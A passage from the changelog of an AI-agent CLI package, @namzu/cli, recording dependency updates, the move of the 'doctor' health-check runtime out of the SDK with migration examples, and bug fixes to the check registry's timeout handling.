  - Tool diff/output lines now wrap to the terminal width instead of running off the right edge.

- Updated dependencies [542f057]
- Updated dependencies [df09910]
- Updated dependencies [140bcc0]
- Updated dependencies [2cf78ed]
- Updated dependencies [229ff8b]
- Updated dependencies [ea21863]
- Updated dependencies [38c4b62]
- Updated dependencies [265150b]
- Updated dependencies [a1c6694]
- Updated dependencies [52af97e]
- Updated dependencies [a71422a]
- Updated dependencies [d6b5bc1]
- Updated dependencies [8fd9349]
- Updated dependencies [63e44f7]
- Updated dependencies [63b4885]
- Updated dependencies [38c4b62]
- Updated dependencies [6b74cd0]
- Updated dependencies [d86b161]
  - @namzu/sdk@1.0.0
  - @namzu/anthropic@1.0.0
  - @namzu/ollama@1.0.0
  - @namzu/openai@1.0.0
  - @namzu/openrouter@1.0.0

## 0.0.3

### Patch Changes

- Updated dependencies [1df23b1]
  - @namzu/sdk@0.6.0

## 0.0.2

### Patch Changes

- Updated dependencies [2749d32]
  - @namzu/sdk@0.5.0

## 0.0.1

### Patch Changes

- 8f076e5: ses_007 Phase 5 — doctor runtime moved from `@namzu/sdk` to `@namzu/cli`. Architectural pivot: kernel = SDK (pure runtime primitives), operator surface = CLI (presentation + tooling).

  ## Breaking changes — `@namzu/sdk`

  The following 12 runtime exports have been **removed** from `@namzu/sdk`. They now live in `@namzu/cli`:

  - `doctor` (singleton), `DoctorRegistry`, `createDoctorRegistry`
  - `registerDoctorCheck`, `runDoctor`
  - `builtInDoctorChecks`
  - `sandboxPlatformCheck`, `cwdWritableCheck`, `tmpdirWritableCheck`
  - `vaultRegisteredCheck`, `providersRegisteredCheck`, `telemetryInstalledCheck`

  The `RunDoctorOptions` type has also been removed from `@namzu/sdk` exports.

  **What stays in `@namzu/sdk`:**

  - The protocol types — `DoctorCheck`, `DoctorCheckResult`, `DoctorCheckContext`, `DoctorCheckRecord`, `DoctorReport`, `DoctorStatus`, `DoctorCategory` — remain in `types/doctor/` so kernel components can implement custom checks against them.
  - `LLMProvider.doctorCheck?(): Promise<DoctorCheckResult>` — the kernel hook that lets a provider expose its own healthcheck stays on the interface.

  ## Migration

  If you were calling the doctor in your own process:

  ```diff
  - import { runDoctor, registerDoctorCheck } from '@namzu/sdk'
  + import { runDoctor, registerDoctorCheck } from '@namzu/cli'
  ```

  If you were running it from the command line:

  ```bash
  # Before — required a custom CLI bin or `pnpm dlx tsx packages/sdk/src/doctor/...`
  # After:
  pnpm dlx @namzu/cli doctor
  # or, after install: namzu doctor
  ```

  Custom check authors continue to import the protocol types from `@namzu/sdk`:

  ```ts
  import type { DoctorCheck, DoctorCheckResult } from "@namzu/sdk";
  import { registerDoctorCheck } from "@namzu/cli";

  const myCheck: DoctorCheck = {
    id: "app.db.reachable",
    category: "custom",
    run: async (): Promise<DoctorCheckResult> => {
      // your probe
    },
  };
  registerDoctorCheck(myCheck);
  ```

  ## New — `@namzu/cli` (initial public release)

  `@namzu/cli` v0.1.0 ships as a public package for the first time. Dual-purpose:

  - **Standalone bin** — `npx @namzu/cli doctor`, or after install: `namzu doctor`. Supports `--json`, `--verbose`, `--category <a,b,c>`, `--per-check-timeout <ms>`, `--wall-clock-timeout <ms>`. Sysexits-aligned exit codes (`0` ok, `1` fail, `2` no config, `70` internal error).
  - **Library** — `import { runDoctor, registerDoctorCheck, builtInDoctorChecks } from '@namzu/cli'` for embedded usage where consumer code wants to invoke the doctor in its own process so app-registered checks are visible.

  **What ships built-in:**

  - `sandbox.platform` (darwin sandbox-exec presence + win32 warn + linux/other inconclusive)
  - `runtime.cwd-writable` + `runtime.tmpdir-writable` (real `fs.access(W_OK)` probes)
  - `telemetry.installed` (dynamic-import probe for `@namzu/telemetry`)
  - `vault.registered` + `providers.registered` (intentionally inconclusive — consumers register their own walking their setup)

  **Why patch-bump-equivalent:** `@namzu/sdk: minor` carries the breaking removal (pre-1.0 cadence); `@namzu/cli: minor` carries the new package's first feature release. Together they make the next release a coordinated cut.

- 82220e3: Doctor — `runDoctor()` accepts streaming callbacks + cooperative cancellation (ses_013 Phase 1).

  Three new optional fields on `RunDoctorOptions`:

  - **`onCheckStart(check)`** — fires immediately before each check's `run()` is invoked.
  - **`onCheckComplete(record)`** — fires exactly once per check after its record is built (whether `pass`, `fail`, `inconclusive`, or `warn`). Defended against double-fire by the same `completed` map that pins the record.
  - **`signal?: AbortSignal`** — cooperative cancellation. When the signal aborts, in-flight checks stop being awaited; their records become `inconclusive` with an "aborted by signal" message. Completed records are preserved verbatim.

  Throwing callbacks are caught + logged + never affect the doctor run or the final `DoctorReport`.

  Substrate for the upcoming TUI mode (later patch in this same series), useful standalone for analytics or custom progress UIs.

  Internal: `packages/cli/tsconfig.json` adds `"jsx": "react-jsx"` + `"jsxImportSource": "react"` in preparation for the TUI's `.tsx` files. No `.tsx` files yet; typecheck still passes. Purely additive — no consumer behavior change.

- 0ba357d: Doctor registry — preserve completed records on wall-timeout + double-fire defense (ses_013 Phase 0).

  Two pre-existing bugs in `DoctorRegistry.run()` surfaced by the ses_013 codex adversarial review:

  - **Wall-timeout aggregation no longer erases completed records.** Before: when the wall-clock timer won the race, every check was mapped to `inconclusive`, even ones that already finished. Fast pass + slow timeout produced 0 pass + N inconclusive. After: only checks that haven't finished by the wall-clock deadline are marked `inconclusive`; completed records are preserved verbatim. Fast pass + slow timeout now correctly produces 1 pass + (N-1) inconclusive.
  - **Completion can no longer double-fire.** A check whose per-check timeout fired microseconds before/after the check itself resolved could produce duplicate records. Defended by an `if (completed.has(check.id)) return` guard inside the per-check callback. First record wins.

  No public API change — bug fix only. 4 new tests pin the corrected contract; suite total 22 → 26.

- Updated dependencies [aead3a8]
- Updated dependencies [8f076e5]
  - @namzu/sdk@0.4.5
